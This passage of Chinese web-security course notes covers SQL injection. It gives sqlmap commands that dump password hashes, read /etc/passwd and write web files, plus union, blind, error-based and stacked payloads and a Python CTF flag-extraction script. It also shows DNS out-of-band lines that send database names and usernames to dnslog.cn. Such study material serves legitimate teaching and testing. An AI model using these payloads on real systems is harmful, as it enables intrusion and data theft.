http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 <br>13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=<span class="hljs-string">&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot;</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1 <br>14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta <br>15./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</span> -p <span class="hljs-built_in">id</span> --prefix <span class="hljs-string">&quot;&#x27;)&quot;</span> --suffix <span class="hljs-string">&quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span><br>16./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span> --auth-type Basic --auth-cred <span class="hljs-string">&quot;testuser:testpass&quot;</span><br>17./sqlmap.py -l burp.log --scope=<span class="hljs-string">&quot;(www)?\.target\.(com|net|org)&quot;</span><br>18./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 <br>19./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="hljs-string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v 1 <br>20./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner <br>21./sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="hljs-string">&#x27;xx&#x27;</span> --dbs --level=3 -p <span class="hljs-string">&quot;uid&quot;</span><br></code></pre></td></tr></table></figure><p><strong>参考</strong>：清除缓存 --purge</p><h3 id="3-3-演示案例：">3.3 演示案例：</h3><ul class="lvl-0"><li class="lvl-2"><p>数据库注入-联合猜解-Oracle&amp;Mongodb</p></li><li class="lvl-2"><p>数据库注入-SQLMAP-DB2&amp;SQLite&amp;Sybase</p><ul class="lvl-2"><li class="lvl-5">直接SQLMAP跑, 会自己识别</li><li class="lvl-5">python3 <a href="http://sqlmap.py">sqlmap.py</a> -u <a href="http://127.0.0.1?id=1">http://127.0.0.1?id=1</a></li></ul></li><li class="lvl-2"><p>数据库注入-SQLMAP-数据猜解&amp;高权限读写执行</p></li></ul><p><strong>#Oracle</strong><br>参考：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a><br>测回显：and 1=2 union select ‘1’,‘2’ from dual<br>爆库：and 1=2 union select ‘1’,(select table_name from user_tables where rownum=1) from dual<br>模糊爆库：and 1=2 union select ‘1’,(select table_name from user_tables where rownum=1 and table_name like ‘%user%’) from dual<br>爆列名：and 1=2 union select ‘1’,(select column_name from all_tab_columns where rownum=1 and table_name=‘sns_users’) from dual<br>爆其他列名：and 1=2 union select ‘1’,(select column_name from all_tab_columns where rownum=1 and table_name=‘sns_users’ and column_name not in (‘USER_NAME’)) from dual<br>爆数据：and 1=2 union select user_name,user_pwd from “sns_users”<br>爆其他数据：and 1=2 union select user_name,user_pwd from “sns_users” where USER_NAME&lt;&gt;‘hu’</p><p><strong>#Mongodb 看代码</strong><br>参考：<a href="https://www.runoob.com/mongodb/mongodb-query.html">https://www.runoob.com/mongodb/mongodb-query.html</a><br>测回显：/new_list.php?id=1’}); return ({title:1,content:‘2<br>爆库： /new_list.php?id=1’}); return ({title:tojson(db),content:‘1<br>爆表： /new_list.php?id=1’}); return ({title:tojson(db.getCollectionNames()),content:‘1<br>爆字段：/new_list.php?id=1’}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1<br>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。<br>db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据</p><p><strong>#简单的注入流程 :</strong><br>1.读取数据库版本，当前用户，当前数据库<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b --current-user --current-db -v 1<br>2.判断当前数据库用户权限<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --privileges -U 用户名 -v 1<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --is-dba -U 用户名 -v 1<br>3.读取所有数据库用户或指定数据库用户的密码<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --users --passwords -v 2<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --passwords -U root -v 2<br>4.获取所有数据库<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --dbs -v 2<br>5.获取指定数据库中的所有表<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --tables -D mysql -v 2<br>6.获取指定数据库名中指定表的字段<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --columns -D mysql -T users -v 2<br>7.获取指定数据库名中指定表中指定字段的数据<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2<br>8.file-read读取web文件<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --file-read “/etc/passwd” -v 2<br>9.file-write写入文件到web<br>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试</p><h2 id="4-Tamper脚本-Base64-Json-md5等">4. Tamper脚本&amp;Base64&amp;Json&amp;md5等</h2><h3 id="4-1-知识点：">4.1 知识点：</h3><p>1、数据表现格式类型注入<br>2、字符转义绕过-宽字节注入</p><div class="info"><p>原理:<br>程序会对参数中存在的 ‘, “, null进行转义, 转义符”&quot;url编码为 %5c, 参数中加入%df’ , 进入程序会变成<br>%df’ --&gt;%df%5c’ --&gt; 運’<br>因为MySQL默认编码为GBK, GBK编码是两个字节存储, utf-8是一个字节</p></div><p>3、数字&amp;字符&amp;搜索&amp;编码&amp;加密等</p><p>#参考资料：<br><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a><br>扫描，利用工具等都不会自动判断数据类型，格式等，所以即使有漏洞也测不出来，具体还是需要人工的去观察，进行工具的修改或加载插件再次探针才可以。</p><h3 id="4-2-演示案例：">4.2 演示案例：</h3><ul class="lvl-0"><li class="lvl-2"><p>本地源码-数字&amp;字符&amp;搜索&amp;编码&amp;JSON</p><ul class="lvl-2"><li class="lvl-5">数字型: 0-9</li><li class="lvl-5">字符型: a-z, 中文, 标点, 注入需要考虑闭合问题<ul class="lvl-4"><li class="lvl-8"><a href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simp</a>le**’ order by 12 --+**</li></ul></li><li class="lvl-5">搜索型: 字符型基础上加入通配符<ul class="lvl-4"><li class="lvl-8"><a href="http://127.0.0.1/blog1/news.php?search=%E6%BC%94%E7%A4%BA">http://127.0.0.1/blog1/news.php?search=</a>演示%’ order by 12 --+</li><li class="lvl-8"><a href="http://127.0.0.1/blog1/news.php?search=%E6%BC%94%E7%A4%BA">http://127.0.0.1/blog1/news.php?search=</a><strong>演示%’ order by 12  and ‘%’=’</strong></li><li class="lvl-8">SQL语句: select * from sy_guestbook where gName like ‘%<strong>演示%’ order by 12  and ‘%’='</strong>%’</li></ul></li><li class="lvl-5">编码型: 数据以编码值传递<ul class="lvl-4"><li class="lvl-8"><a href="http://127.0.0.1/blog1/news.php?base=MQ==">http://127.0.0.1/blog1/news.php?base=</a></li></ul></li><li class="lvl-5">加密型: 数据以加密密文传送<ul class="lvl-4"><li class="lvl-8"><a href="http://127.0.0.1/blog1/news.php?base=MQ==">http://127.0.0.1/blog1/news.php?base=<strong>MQ==</strong></a></li><li class="lvl-8">我们传入的数据都应是加密后的, 程序解密后拼接到SQL语句中</li></ul></li><li class="lvl-5">格式型: JSON<ul class="lvl-4"><li class="lvl-8">json={“username”: “张三”}</li><li class="lvl-8">在程序获取的时候, get(“username”) --&gt; 张三</li><li class="lvl-8">payload: json={“username”: “<strong>张三’ order by 12–+</strong>”}</li><li class="lvl-8">考虑的是, 获取到值, 值再拼接到SQL中, SQL中的闭合方式</li></ul></li></ul></li><li class="lvl-2"><p>墨者靶场-字符转义处理防护-宽字节注入</p><ul class="lvl-2"><li class="lvl-5"><a href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simple</a><strong>’ order by 12–+</strong></li><li class="lvl-5">select * from sy_guestbook where gTpl=‘simple**’ order by 12–+**’  # 会自动转义单引号</li><li class="lvl-5">php中 addslashes()函数会对字符 单引号’、双引号&quot;、反斜线\与 NULL, 进行转义</li><li class="lvl-5"></li></ul></li><li class="lvl-2"><p>真实WEB-数据编码接受处理-base64注入</p></li><li class="lvl-2"><p>真实WEB-JSON数据格式&amp;MD5加密数据</p></li><li class="lvl-2"><p>工具脚本-SQLMAP-脚本Tamper使用指南</p><ul class="lvl-2"><li class="lvl-5">python <a href="http://sqlmap.py">sqlmap.py</a> -u “<a href="http://127.0.0.1/blog1/news.php?gtpl=simple">http://127.0.0.1/blog1/news.php?gtpl=simple</a>” --tamper=<a href="http://base64encode.py">base64encode.py</a></li><li class="lvl-5">python <a href="http://sqlmap.py">sqlmap.py</a> -u “<a href="http://127.0.0.1/blog1/news.php?kuan=simple%22">http://127.0.0.1/blog1/news.php?kuan=simple”</a> --tamper=unmagicquotes</li></ul></li></ul><h2 id="5-HTTP头XFF-COOKIE-POST请求">5. HTTP头XFF&amp;COOKIE&amp;POST请求</h2><h3 id="5-1-知识点：">5.1 知识点：</h3><p>1、数据请求方式-GET&amp;POST&amp;COOKIE等<br>2、常见功能点请求方式-用户登录&amp;IP记录等<br>3、黑盒白盒注入测试要点-SQLMAP注入参数</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662904260041-3c830eca-8a9c-4fd8-8204-bed4250af70a.png#averageHue=%23f9f8f8&amp;clientId=uf402b5e3-f838-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=382&amp;id=u20d1d16a&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=478&amp;originWidth=914&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=256411&amp;status=done&amp;style=none&amp;taskId=ud7ceb4a1-d110-4472-8e60-d86701ebfb8&amp;title=&amp;width=731.2" alt="image.png"></p><p>#补充点：黑盒测试：功能点分析白盒测试：功能点分析&amp;关键代码追踪</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662905491413-1da472de-4c38-4a20-978a-41eb7cbcc7b3.png#averageHue=%23eeedeb&amp;clientId=uf402b5e3-f838-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=125&amp;id=ud88a4cbf&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=156&amp;originWidth=460&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=7214&amp;status=done&amp;style=none&amp;taskId=ucabbe095-5926-4ef6-b906-b696c4a0859&amp;title=&amp;width=368" alt="image.png"><br>他为什么会知道我还可以尝试四次登录</p><ol><li class="lvl-3"><p>记录了我的IP</p></li><li class="lvl-3"><p>记录我账号</p></li><li class="lvl-3"><p>记录我cookie</p></li></ol><h3 id="5-2-演示案例：">5.2 演示案例：</h3><hr><ul class="lvl-0"><li class="lvl-2"><p>GET&amp;POST&amp;COOKIE&amp;SERVER</p></li><li class="lvl-2"><p>实例黑盒-后台表单登陆框-POST注入</p><ul class="lvl-2"><li class="lvl-5">python <a href="http://sqlmap.py">sqlmap.py</a> -u “<a href="http://127.0.0.1/login.php">http://127.0.0.1/login.php</a>” --data “name=zhangsan&amp;passwd=zhangsan”</li></ul></li><li class="lvl-2"><p>实例白盒-ESPCMS-商品购买-COOKIE注入</p><ul class="lvl-2"><li class="lvl-5">第28讲最后40分钟, 没听懂</li></ul></li><li class="lvl-2"><p>实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入</p><ul class="lvl-2"><li class="lvl-5">X_Forward_For: 1.1.1.1</li></ul></li></ul><p>#部分语言接受代码块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html; charset=utf-8&quot;</span>);<br><br><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;g&#x27;</span>];<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$cookie</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$request</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>]; <span class="hljs-comment">//当前访问url地址</span><br><span class="hljs-variable">$user_agent</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_USER_AGENT&quot;</span>]; <span class="hljs-comment">//浏览器信息</span><br><span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]; <span class="hljs-comment">// 8.8.8.8</span><br><br><br><span class="hljs-keyword">echo</span><span class="hljs-variable">$get</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$request</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$user_agent</span>.<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-variable">$ip</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Java Spring  不同框架，不同写法<br>method=RequestMethod.GET<br>method=RequestMethod.POST<br>request.getParameter(“参数名”);<br>可以直接获取get请求的参数key对应的value<br>也可以从请求体中获取参数的key对应的value</p><p>Python flask 不同框架，不同写法<br>requests.get<br>requests.post<br>request.args.get(key)<br>request.form.get(key)<br>request.values.get(key)</p><h2 id="6-增删改查-盲注-延时-布尔-报错">6. &amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错</h2><hr><h3 id="6-1-知识点：">6.1 知识点：</h3><p>1、明确查询方式注入Payload<br>2、明确查询方式注入产生功能<br>3、明确SQL盲注延时&amp;布尔&amp;报错</p><p>#详细点：盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。解决：常规的联合查询注入不行的情况我们可以知道盲注分为以下三类：<br>-基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid<br>-基于时间的SQL盲注-延时判断<br>if,sleep<br>-基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue<br><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>参考：<br>like ‘ro%’ #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0) #条件成立 返回5 反之 返回0<br>sleep(5) #SQL语句延时执行5秒<br>mid(a,b,c) #从位置b开始，截取a字符串的c位<br>substr(a,b,c) #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())=8 #判断数据库database()名的长度<br>ord=ascii ascii(x)=97 #判断x的ascii码是否等于97</p><p>SQL查询方式注入<br>select,insert,update,delete,orderby等</p><p>基本知识本地测试<br>select * from member where username like ‘vi%’;<br>select * from member where username regexp ‘^x’;<br>select * from member where id=1 and sleep(1);<br>select * from member where id=1 and if(1&gt;2,sleep(1),0);<br>select * from member where id=1 and if(1&lt;2,sleep(1),0);<br>select * from member where id=1 and length(database())=7;<br>select * from member where id=1 and left(database(),1)=‘p’;<br>select * from member where id=1 and left(database(),2)=‘pi’;<br>select * from member where id=1 and substr(database(),1,1)=‘p’;<br>select * from member where id=1 and substr(database(),2,1)=‘i’;<br>select * from member where id=1 and ord(left(database(),1))=112;</p><h3 id="6-2-演示案例：">6.2 演示案例：</h3><hr><ul class="lvl-0"><li class="lvl-2"><p>SQL-盲注&amp;布尔&amp;报错&amp;延时</p></li><li class="lvl-2"><h2 id="查询-select-xhcms-布尔盲注">查询-select-xhcms-布尔盲注</h2></li><li class="lvl-2"><p>插入-insert-xhcms-报错盲注</p><ul class="lvl-2"><li class="lvl-5"><a href="http://127.0.0.1:81/index.php?r=contact">http://127.0.0.1:81/index.php?r=contact</a></li><li class="lvl-5">留言板: 显然会将数据写入到数据库, 写入时不需要会显得, 所以选用盲注</li><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970652984-dda77749-cecc-4fd0-95bf-1ac1594e31c4.png#averageHue=%23fcfcfc&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=drop&amp;id=u2bb66828&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-12%20161720.png&amp;originHeight=357&amp;originWidth=892&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16689&amp;status=done&amp;style=none&amp;taskId=ua2ff3515-b69b-4dd1-b844-9670f560d9b&amp;title=" alt="屏幕截图 2022-09-12 161720.png"></li><li class="lvl-5">’ or updatexml(1,concat(0x3a,(version())),1) or ’</li><li class="lvl-6">’ or updatexml(1,concat(0x7e,(version())),0) or ’</li><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970562301-01177dba-cd1b-4ff7-bd32-23bc575c070e.png#averageHue=%23f3f1f0&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=0.734&amp;from=paste&amp;height=195&amp;id=u2a2f4e1e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=243&amp;originWidth=593&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22732&amp;status=done&amp;style=none&amp;taskId=uc47e707b-c976-4251-8bea-db76a0713d9&amp;title=&amp;width=477" alt="image.png"></li></ul></li><li class="lvl-2"><p>更新-update-xhcms-报错盲注</p><ul class="lvl-2"><li class="lvl-5"><a href="http://127.0.0.1:81/index.php?r=software&amp;cid=1">http://127.0.0.1:81/index.php?r=software&amp;cid=1</a></li><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662971046141-f6981ba9-11b1-4800-bbf3-77a565fbbf99.png#averageHue=%23fbf7f6&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=294&amp;id=ud11624c7&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=368&amp;originWidth=598&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=52540&amp;status=done&amp;style=none&amp;taskId=ufd53a628-4bb0-45ce-8abe-0290f1da1c9&amp;title=&amp;width=478.4" alt="image.png"></li><li class="lvl-5">and updatexml(1,concat(0x7e,(version())),0)</li><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970559563-c41ff0ab-914f-4fa0-9f23-751d4c58bab1.png#averageHue=%23f3f1f0&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=0.7271&amp;from=paste&amp;height=194&amp;id=u42899b0f&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=243&amp;originWidth=593&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22732&amp;status=done&amp;style=none&amp;taskId=u1ea862ae-49d5-4d22-bbd9-2e330177f4e&amp;title=&amp;width=474" alt="image.png"></li><li class="lvl-5"></li></ul></li><li class="lvl-2"><p>删除-delete-kkcms-延时盲注</p><ul class="lvl-2"><li class="lvl-5"><a href="http://127.0.0.1:82/admin/cms_usergroup.php?del=1">http://127.0.0.1:82/admin/cms_usergroup.php?del=1</a> and if(1=1,sleep(5),0)</li><li class="lvl-5">delete from xtcms_user_group where ug_id=2 and if(1=1, sleep(5),0)</li><li class="lvl-5">delete from xtcms_user_group where ug_id=2 or if(1=1, sleep(5),0)</li></ul></li></ul><hr><p>#SQL-盲注&amp;布尔&amp;报错&amp;延时<br>PHP开发项目-输出结果&amp;开启报错基于延时：都不需要<br>/blog/news.php?id=1 and if(1=1,sleep(5),0)<br>基于布尔：有数据库输出判断标准<br>/blog/news.php?id=1 and length(database())=7<br>基于报错：有数据库报错处理判断标准<br>/blog/news.php?id=2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p><p>知识点：<br>1、查询方式增删改查四种特性决定，部分是不需要进行数据取出和显示，所以此类注入基本上需要采用盲注才能正常得到结果（黑盒测试可以根据功能判断注入查询方式）<br>2、查询方式增删改查四种特性决定应用功能点（会员注册，删除新闻，修改文章等）</p><h2 id="7-CTF-二次-堆叠-DNS带外">7. CTF&amp;二次&amp;堆叠&amp;DNS带外</h2><hr><h3 id="7-1-知识点：">7.1 知识点：</h3><p>1、数据库堆叠注入根据数据库类型决定是否支持多条语句执行<br>2、数据库二次注入应用功能逻辑涉及上导致的先写入后组合的注入<br>3、数据库Dnslog注入解决不回显(反向连接),SQL注入,命令执行,SSRF等<br>4、黑盒模式分析以上二次注入：插入后调用显示操作符合堆叠注入：判断注入后直接调多条执行<br>DNS注入：在注入上没太大利用价值，其他还行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662964645817-9218a08f-9511-4546-8035-d9d550e53490.png#averageHue=%23eceeeb&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=drop&amp;id=u81b759be&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=277&amp;originWidth=558&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=112010&amp;status=done&amp;style=none&amp;taskId=u58aa954f-da43-4447-a1f5-89c8ae268f0&amp;title=" alt="image.png"></p><h3 id="7-2-演示案例：">7.2 演示案例：</h3><p>select * from adf where email =“sfa”<br>xiaodi’, address=version() #</p><ul class="lvl-0"><li class="lvl-2"><p>二次注入-74CMS&amp;网鼎杯2018Unfinish</p><ul class="lvl-2"><li class="lvl-5">74CMS 50分钟开始将白盒代码, 以后再听</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br>register_url = <span class="hljs-string">&#x27;/register.php&#x27;</span><br>login_url = <span class="hljs-string">&#x27;/login.php&#x27;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    register_data = &#123;<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;111@123.com%d&#x27;</span> % i,<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1)) + &#x27;0&quot;</span> % i,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>    &#125;<br>    res = requests.post(url=register_url, data=register_data)<br><br>    login_data = &#123;<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;111@123.com%d&#x27;</span> % i,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>    &#125;<br>    res_ = requests.post(url=login_url, data=login_data)<br>    code = re.search(<span class="hljs-string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(code.group(<span class="hljs-number">1</span>))), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>堆叠注入-数据库类型&amp;强网杯2019随便注</p><ul class="lvl-2"><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662975992141-34c96e66-1229-4751-a61e-7f29d038adf0.png#averageHue=%23efeeed&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=278&amp;id=u493b2804&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=347&amp;originWidth=1089&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=47393&amp;status=done&amp;style=none&amp;taskId=u8b198a81-46e8-4da4-b2a7-c3e0315ac27&amp;title=&amp;width=871.2" alt="image.png"></li><li class="lvl-5">程序禁用了select等语句</li><li class="lvl-5">';SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</li><li class="lvl-5">将select编码成16进制数据, 设置一个变量a, 在执行变量a</li><li class="lvl-5"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662976075905-f11b0af9-0c94-490d-8dbf-d68871cf4133.png#averageHue=%23f0f0ef&amp;clientId=u80c87768-7763-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=243&amp;id=u57cd69aa&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=304&amp;originWidth=829&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=20739&amp;status=done&amp;style=none&amp;taskId=u23580700-9423-439d-a16b-b13cd83870d&amp;title=&amp;width=663.2" alt="image.png"></li></ul></li><li class="lvl-2"><p>DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</p></li><li class="lvl-2"><p>平台http://www.dnslog.cn  <a href="http://admin.dnslog.link">http://admin.dnslog.link</a>  <a href="http://ceye.io">http://ceye.io</a></p></li><li class="lvl-2"><p>应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等</p></li><li class="lvl-2"><p>SQL注入：select load_file(concat(‘\\’,(select database()),‘.7logee.dnslog.cn\aa’));</p></li><li class="lvl-2"><p>and (select load_file(concat(‘//’,(select database()),‘.69knl9.dnslog.cn/abc’)))</p></li><li class="lvl-2"><p>命令执行：ping %USERNAME%.7logee.dnslog.cn</p></li></ul><p>#二次注入-74CMS&amp;网鼎杯2018Unfinish<br>CTF-[网鼎杯2018]Unfinish-黑盒<br>CMS-74CMS个人会员中心-黑白盒</p><p>#堆叠注入-数据库类型&amp;强网杯2019随便注根据数据库类型决定是否支持多条语句执行支持堆叠数据库类型：MYSQL MSSQL Postgresql等<br>';show databases;<br>';show tables;<br>';show columns from <code>1919810931114514</code>;<br>';select flag from <code>1919810931114514</code>;<br>';SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
